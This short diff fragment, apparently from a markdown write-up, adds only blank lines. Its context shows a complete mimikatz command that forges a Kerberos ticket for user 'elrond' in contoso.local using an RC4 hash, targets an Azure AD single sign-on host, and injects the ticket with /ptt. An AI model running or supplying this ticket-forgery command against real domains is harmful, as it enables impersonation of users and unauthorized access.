@@ -17,3 +17,5 @@ mimikatz.exe "kerberos::golden /user:elrond
 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
 /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
 ```
+
+
